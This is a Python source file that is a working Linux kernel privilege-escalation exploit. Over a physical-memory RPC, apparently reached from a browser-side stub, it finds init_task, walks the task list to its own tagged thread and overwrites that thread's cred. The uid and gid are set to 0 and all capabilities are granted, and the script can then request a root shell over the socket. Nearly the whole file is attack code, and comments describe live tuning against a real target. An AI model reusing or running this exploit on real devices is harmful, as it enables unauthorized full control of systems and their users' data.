"""Final owner->root end-game over the physmap RPC.

Two facts learned live (2026-10-20):
  * the running kernel Image is our uImage at phys 0x20008000 (PHYS_OFFSET
    0x20000000), but its .data is shifted +0x12000 relative to the shipped file;
  * init_task.tasks.next is corrupt/unusable, while the prev links are intact.

So:
  1. find init_task exactly through __ksymtab (string sequence + name pointer),
  2. find the tasks offset by scanning init_task for a list whose prev points to
     a task (printable comm at +0x400),
  3. walk *backwards* along prev until our "PHYSRPC1" thread is found,
  4. patch uid..fsgid to 0 through the cred pointer stored right before comm.

Usage: python recon/kroot.py [--exec]
"""
import struct
import sys
import time

import physmap as T

V = 0xA0000000
ABS = lambda ph: (ph + V) & 0xFFFFFFFF
PHYS = lambda va: (va - V) & 0xFFFFFFFF

# uImage facts (file offsets inside the raw Image)
OFF_SEQ = 0x8912CA                  # "name_to_dev_t\0init_task\0kernel_neon_end"
SEQ = b"name_to_dev_t\x00init_task\x00kernel_neon_end"
OFF_STR = 0x8912D8                  # "init_task"
DATA_SHIFT = 0x12000                # observed .data shift of the running build
O_COMM = 0x400
O_CRED = 0x3F8
O_REAL = 0x3F4
TAG = b"PHYSRPC1"
CAP_FULL_LO = 0xFFFFFFFF
CAP_FULL_HI = 0x0000003F          # 0x3fffffffff = all 38 caps in the bounding set
O_CAP_PERMITTED = 48
O_CAP_EFFECTIVE = 56
# ids = (5001, 100) x4 for an owner process: 32 bytes that cannot occur by accident
OWNER_PAT = struct.pack("<8I", 5001, 100, 5001, 100, 5001, 100, 5001, 100)
PAGE = 0x1000


def iter_owner_creds(rpc, start, stop, batch_pages=4096, pattern=OWNER_PAT,
                     progress=None):
    """Yield the cred address implied by every owner-id pattern in [start, stop).

    Page-straddle safe.  `data.find(PAT)` on one 4 KiB page cannot see a 32-byte
    pattern split across two pages (sim_rpc's self-test proves a 16/16 split is
    invisible per page); keeping the last len(pattern)-1 bytes of each page as a
    carry finds it without a second full scan.  A page that fails to read breaks
    the carry: the next page is not physically adjacent to the last good one.
    """
    overlap = len(pattern) - 1
    page = start
    carry = b""
    scanned = 0
    hits = 0
    while page < stop:
        count = min(batch_pages, max(1, (stop - page + PAGE - 1) // PAGE))
        for p, data in rpc.readmany(page, count):
            scanned += 1
            if data is None:
                carry = b""
                continue
            blob = carry + data
            off = blob.find(pattern)
            while off >= 0:
                # carry belongs to the page before p
                yield (p - len(carry) + off - 4) & 0xFFFFFFFF
                hits += 1
                off = blob.find(pattern, off + 1)
            carry = data[-overlap:] if overlap else b""
        page += count * PAGE
        if progress:
            progress(page, scanned, hits)


def _find_seq(rpc, base):
    want = base + OFF_SEQ + DATA_SHIFT
    for span in (0x100000, 0x400000, 0x1000000):
        start = (want - span) & ~0xFFFF
        end = want + span
        a = start
        while a < end:
            try:
                d = rpc.read(a, 0x10000)
            except Exception:
                a += 0x10000
                continue
            i = d.find(SEQ)
            if i >= 0:
                return a + i
            a += 0x10000
        print(f"[!] ksymtab string not in +-{span:#x}, widening", flush=True)
    return None


def locate_init(rpc, base):
    seq_phys = _find_seq(rpc, base)
    if seq_phys is None:
        return None
    str_phys = seq_phys + (OFF_STR - OFF_SEQ)
    name = ABS(str_phys)
    pat = struct.pack("<I", name)
    start = (str_phys - 0x100000) & ~0xFFFF
    a = start
    while a < str_phys:
        try:
            d = rpc.read(a, 0x10000)
        except Exception:
            a += 0x10000
            continue
        i = d.find(pat)
        while i >= 0:
            p = a + i
            try:
                val = rpc.read_u32((p - 4) & 0xFFFFFFFF)
                ns = rpc.read_u32((p + 4) & 0xFFFFFFFF)
            except Exception:
                val = ns = 0
            if T._kernel_ptr(val) and ns == 0:
                print(f"[+] init_task = {T.hexs(val)} (phys {T.hexs(PHYS(val))})", flush=True)
                return val
            i = d.find(pat, i + 1)
        a += 0x10000
    return None


def _comm_at(rpc, task_virt):
    return rpc.read(PHYS(task_virt) + O_COMM, 16)


def find_offsets(rpc, init_phys, init_virt):
    """Return candidate tasks-list offsets: init+o+4 (prev) points at a task."""
    buf = rpc.read(init_phys, 0x800)
    cands = []
    for o in range(0, 0x800 - 8, 4):
        nxt = T.u32(buf, o)
        prv = T.u32(buf, o + 4)
        # only `prev` is needed: init_task.tasks.next is unusable on this build
        if not T._kernel_ptr(prv):
            continue
        H = (init_virt + o) & 0xFFFFFFFF
        if prv == H:
            continue
        task = (prv - o) & 0xFFFFFFFF
        try:
            comm = _comm_at(rpc, task)
        except Exception:
            continue
        name = comm.split(b"\0")[0]
        if (comm and all(32 <= c < 127 or c == 0 for c in comm) and name
                and name not in (b"per/0", b"0")):
            cands.append((o, name.decode("latin-1")))
    return cands


def walk_back(rpc, init_phys, init_virt, off, max_hops=2500, verbose=False):
    """Walk init.tasks.prev backwards.  The list mutates under us, so a broken
    link is retried with a fresh tail instead of being treated as the end."""
    H = (init_virt + off) & 0xFFFFFFFF
    for attempt in range(5):
        cur = rpc.read_u32(init_phys + off + 4)
        seen = set()
        consistent = True
        for i in range(max_hops):
            if cur == H:
                break
            if cur == 0 or cur in seen or not T._kernel_ptr(cur):
                consistent = False
                break
            seen.add(cur)
            task = (cur - off) & 0xFFFFFFFF
            try:
                comm = _comm_at(rpc, task)
            except Exception:
                consistent = False
                break
            if comm.startswith(TAG):
                return task, PHYS(task) + O_COMM, i
            if verbose and i % 100 == 0:
                print(f"    [{i:4d}] {comm.split(b'\\0')[0]!r}", flush=True)
            try:
                nxt = rpc.read_u32(PHYS(cur) + 4)
            except Exception:
                consistent = False
                break
            if not T._kernel_ptr(nxt):
                consistent = False
                break
            cur = nxt
        if consistent:
            return None            # walked the whole list, tag absent
        time.sleep(0.15)
    return None


def patch_full(rpc, cred_phys):
    """uid/gid -> 0 and permitted/effective caps -> all (CAP_DAC_OVERRIDE,
    CAP_MAC_OVERRIDE, CAP_SYS_ADMIN, ...).  Bounding set is already full.

    Caps are written ONLY after an ids write that started from uid 5001.  A cred
    that already reads 0 is reported and left completely untouched: a stale task
    pointer can land on init's cred, and v39 briefly wrote caps to it (review
    2026-10-26).
    """
    if cred_phys >= 0xC0000000:
        cred_phys = PHYS(cred_phys)
    try:
        uid = rpc.read_u32(cred_phys + 4)
    except Exception:
        return False
    if uid == 0:
        print(f"[*] cred {T.hexs(cred_phys)} already uid 0 - caps untouched",
              flush=True)
        return False
    if uid != 5001:
        print(f"[-] skip {T.hexs(cred_phys)}: uid {uid} is not ours (5001)",
              flush=True)
        return False
    if not T.patch_ids(rpc, cred_phys):
        return False
    for off in (O_CAP_PERMITTED, O_CAP_EFFECTIVE):
        for k, val in ((0, CAP_FULL_LO), (4, CAP_FULL_HI)):
            st = rpc.write32(cred_phys + off + k, val)
            if st != 0:
                print(f"[-] cap write at cred+{off + k} failed: {st}", flush=True)
                return False
    uid = int.from_bytes(rpc.read(cred_phys + 4, 4), "little")
    perm = int.from_bytes(rpc.read(cred_phys + O_CAP_PERMITTED, 8), "little")
    eff = int.from_bytes(rpc.read(cred_phys + O_CAP_EFFECTIVE, 8), "little")
    print(f"[+] cred now uid={uid} cap_permitted={perm:#x} cap_effective={eff:#x}",
          flush=True)
    return uid == 0 and perm == 0x3FFFFFFFFF and eff == 0x3FFFFFFFFF


def patch_ours(rpc, cred):
    """Patch `cred` only if it is still OUR process's (uid 5001).

    Mirrors the boot payload's v15 gate on the browser-lane side.  A cred that
    already reads uid 0 is rooted - ours from an earlier pass, or the target of a
    stale task pointer (init's, for one).  Writing it would touch memory that is
    not ours for no gain, so it counts as "already done".  Returns True when the
    cred needs no write or the write verified, False when it is not ours,
    unreadable, or the write failed.
    """
    if not T._kernel_ptr(cred):
        return False
    try:
        uid = rpc.read_u32(PHYS(cred) + 4)
    except Exception:
        return False
    if uid == 0:
        return True
    if uid != 5001:
        return False
    return patch_full(rpc, cred)


def root(rpc, do_exec=False):
    base = T.find_image_base(rpc)
    if base is None:
        print("[-] kernel base not found", flush=True)
        return False
    init_virt = locate_init(rpc, base)
    if init_virt is None:
        print("[-] init_task not located", flush=True)
        return False
    init_phys = PHYS(init_virt)
    cands = find_offsets(rpc, init_phys, init_virt)
    print(f"[*] tasks-list candidates: {[(hex(o), n) for o, n in cands]}", flush=True)
    for off, name in cands:
        hit = walk_back(rpc, init_phys, init_virt, off)
        if hit is None:
            continue
        task, tag_phys, hops = hit
        cred = rpc.read_u32(tag_phys - 8)
        real = rpc.read_u32(tag_phys - 12)
        print(f"[+] found PHYSRPC1 at {T.hexs(task)} after {hops} prev hops; "
              f"cred={T.hexs(cred)} real_cred={T.hexs(real)}", flush=True)
        wrote = already = False
        for c in {cred, real}:
            if not T._kernel_ptr(c):
                continue
            try:
                uid = rpc.read_u32(PHYS(c) + 4)
            except Exception:
                uid = None
            if uid == 0:
                already = True
                continue
            if uid != 5001:
                continue
            if patch_full(rpc, c):
                wrote = True
        if wrote:
            print("[+] uid patch applied: this process is now uid 0", flush=True)
            if do_exec:
                print("[*] sending EXEC (root shell on the socket)", flush=True)
                rpc.exec_shell()
            return True
        if already:
            # Same rule as root_via_fork: a uid-0 cred is not proof that THIS
            # stub is rooted (a stale task pointer can reach init's cred), so do
            # not claim success and do not send EXEC.
            print("[!] only uid-0 creds were found on this walk - that is not "
                  "proof this stub is rooted (a stale task can point at init's "
                  "cred); not sending EXEC. Use kernel_root.py --fork or reload "
                  "the page.", flush=True)
            return False
    print("[-] PHYSRPC1 not found in any candidate list", flush=True)
    return False


def _fork_pid(rpc):
    rpc._cmd(6, 0, 0, 0)
    return struct.unpack("<i", rpc._recv_exact(4))[0]


def _tagged_near_tail(rpc, init_phys, init_virt, off, tag, hops=400):
    """Collect task addresses whose comm starts with `tag`, walking the tail."""
    found = set()
    try:
        cur = rpc.read_u32(init_phys + off + 4)
    except Exception:
        return found
    for _ in range(hops):
        if not T._kernel_ptr(cur):
            break
        task = (cur - off) & 0xFFFFFFFF
        try:
            comm = _comm_at(rpc, task)
        except Exception:
            break
        if comm.startswith(tag):
            found.add(task)
        try:
            cur = rpc.read_u32(PHYS(cur) + 4)
        except Exception:
            break
    return found


def _find_fork_task(rpc, init_phys, init_virt, off, attempts=10, hops=40,
                    exclude=None):
    exclude = exclude or set()
    for _ in range(attempts):
        try:
            cur = rpc.read_u32(init_phys + off + 4)
        except Exception:
            time.sleep(0.1)
            continue
        for _i in range(hops):
            if not T._kernel_ptr(cur):
                break
            task = (cur - off) & 0xFFFFFFFF
            try:
                comm = _comm_at(rpc, task)
            except Exception:
                break
            if comm.startswith(b"PHYRFORK") and task not in exclude:
                return task, PHYS(task) + O_COMM
            try:
                cur = rpc.read_u32(PHYS(cur) + 4)
            except Exception:
                break
        time.sleep(0.1)
    return None


def _find_tags_near_tail(rpc, init_phys, init_virt, off, tag, hops=400):
    """Every task whose comm starts with `tag`, walking init.tasks.prev.

    Collecting ALL of them matters on this kernel: a freed PHYSRPC1 task from an
    earlier page load can sit closer to the tail than the live one.  The old
    single-hit lookup then returned the dead task, its cred pointer failed the
    sanity check, and root_via_fork retried six times against the same corpse
    ("skip 0xe234cf00 (not a cred)") while the live thread was one hop further.
    """
    found = []
    head = (init_virt + off) & 0xFFFFFFFF
    seen = set()
    try:
        cur = rpc.read_u32(init_phys + off + 4)
    except Exception:
        return found
    for _ in range(hops):
        if not T._kernel_ptr(cur) or cur == head or cur in seen:
            break
        seen.add(cur)
        task = (cur - off) & 0xFFFFFFFF
        try:
            comm = _comm_at(rpc, task)
        except Exception:
            break
        if comm.startswith(tag):
            found.append(task)
        try:
            cur = rpc.read_u32(PHYS(cur) + 4)
        except Exception:
            break
    return found


def _sane_cred(rpc, cred):
    """A real cred lives in the kernel direct map and has a small refcount and
    small uid/gid values.  Anything else (vmalloc pointer, ASCII data, stale
    task field) must never be patched.

    The bounds mirror the payload's SaneCred exactly (v39): every id below
    0x1000000, and the uid itself below 0x100000.  The old `< 0x100000` test on
    the gid as well rejected a cred the payload would have accepted.
    """
    if not (0xC0000000 <= cred <= 0xFFFFFFFF) or (cred & 3):
        return False
    try:
        head = rpc.read(PHYS(cred), 36)
    except Exception:
        return False
    usage = T.u32(head, 0)
    ids = struct.unpack_from("<8I", head, 4)
    if usage > 0x10000:
        return False
    if any(v > 0x1000000 for v in ids):
        return False
    return ids[0] < 0x100000


def root_via_fork(rpc, do_exec=False):
    """Deterministic root: fork a child (newest task, at the list tail), find it
    a hop or two from init.tasks.prev, locate our PHYSRPC1 task through the
    child's parent pointers, patch the shared cred — but only after validating
    that the pointer actually looks like a cred.  Retries until it does."""
    base = T.find_image_base(rpc)
    if base is None:
        return False
    init_virt = locate_init(rpc, base)
    if init_virt is None:
        return False
    init_phys = PHYS(init_virt)

    # Fork exactly ONE landmark.  A fork that returns a pid HAS created a paused
    # PHYRFORK: if the walk cannot find it, do not fork again - the first one
    # stays behind and crowds the tail (trap 8).  A fork that returns no pid
    # created nothing, so retrying that is safe.
    child = None
    for _ in range(2):
        pre = _tagged_near_tail(rpc, init_phys, init_virt, 0x23C, b"PHYRFORK", 400)
        pid = -1
        try:
            pid = _fork_pid(rpc)
        except Exception as exc:
            print(f"[!] fork failed: {exc}", flush=True)
            pid = -1
        print(f"[*] fork -> {pid} (known orphans: {len(pre)})", flush=True)
        if pid <= 0:
            time.sleep(0.2)      # no child was created; a retry adds nothing
            continue
        # _find_fork_task re-walks with its own retries (~1 s); one call is the
        # whole budget for this landmark.
        hit = _find_fork_task(rpc, init_phys, init_virt, 0x23C, hops=200,
                              exclude=pre)
        if hit is not None:
            child, _ = hit
            print(f"[+] PHYRFORK child at {T.hexs(child)}", flush=True)
        else:
            print(f"[-] PHYRFORK pid {pid} was created but not found in the "
                  f"walk; not forking a second landmark - reload the page",
                  flush=True)
        break
    if child is None:
        print("[-] no usable landmark - reload the page for a fresh stub",
              flush=True)
        return False

    for attempt in range(6):
        print(f"[*] attempt {attempt + 1}: scanning around child "
              f"{T.hexs(child)}", flush=True)
        task = child

        # Primary: find our own PHYSRPC1 thread by walking the tail; its cred
        # is the one getuid() reads, and it is validated before patching.
        # Try EVERY tag, not just the first: freed threads from an earlier page
        # load can be nearer the tail, and their cred pointer is garbage.
        targets = []
        for t in _find_tags_near_tail(rpc, init_phys, init_virt, 0x23C,
                                      b"PHYSRPC1", 400):
            if t not in targets:
                print(f"[+] PHYSRPC1 task at {T.hexs(t)}", flush=True)
                targets.append(t)

        # Fallback: parent pointers inside the child's task_struct.
        if not targets:
            buf = rpc.read(PHYS(task), 0x800)
            for o in range(0, 0x800, 4):
                v = T.u32(buf, o)
                if not T._kernel_ptr(v):
                    continue
                try:
                    c = _comm_at(rpc, v)
                except Exception:
                    continue
                if c.startswith(b"PHYSRPC1"):
                    targets.append(v)
        if not targets:
            print("[-] no PHYSRPC1 task found", flush=True)
            time.sleep(0.2)
            continue

        patched = already = False
        for parent in targets:
            for off in (O_CRED, O_REAL):
                cred = rpc.read_u32(PHYS(parent) + off)
                if not _sane_cred(rpc, cred):
                    print(f"[-] skip {T.hexs(cred)} (not a cred)", flush=True)
                    continue
                print(f"[+] task {T.hexs(parent)} cred={T.hexs(cred)}", flush=True)
                try:
                    uid = rpc.read_u32(PHYS(cred) + 4)
                except Exception:
                    uid = None
                if uid == 0:
                    # Ours from an earlier pass, or a stale pointer's target.
                    # Never write it (payload v15 rule); keep scanning for ours.
                    print(f"[-] {T.hexs(cred)} already uid 0 (nothing to write)",
                          flush=True)
                    already = True
                    continue
                if uid != 5001:
                    print(f"[-] skip {T.hexs(cred)} (uid {uid}, not ours)", flush=True)
                    continue
                if patch_full(rpc, cred):
                    patched = True
        if patched:
            print("[+] parent cred patched: stub is uid 0 + full caps", flush=True)
            if do_exec:
                print("[*] sending EXEC", flush=True)
                rpc.exec_shell()
            return True
        if already:
            # NOT proof that this stub is rooted: a freed PHYSRPC1 task can sit
            # nearer the tail and point at init's cred (uid 0), while the live
            # uid-5001 stub was not in the walked range.  Returning True here
            # used to send EXEC and hide that (review 2026-10-26).
            print("[!] only uid-0 creds were found among the tags - that is not "
                  "proof this stub is rooted (a stale task can point at init's "
                  "cred); not sending EXEC. Reload the page and retry.", flush=True)
            return False
        time.sleep(0.2)
    print("[-] no sane cred found after retries", flush=True)
    return False


def main():
    import os
    rpc = T.RPC(timeout=20)
    try:
        if "--fork" in sys.argv:
            root_via_fork(rpc, do_exec="--exec" in sys.argv)
        else:
            root(rpc, do_exec="--exec" in sys.argv)
    finally:
        rpc.close()


if __name__ == "__main__":
    main()
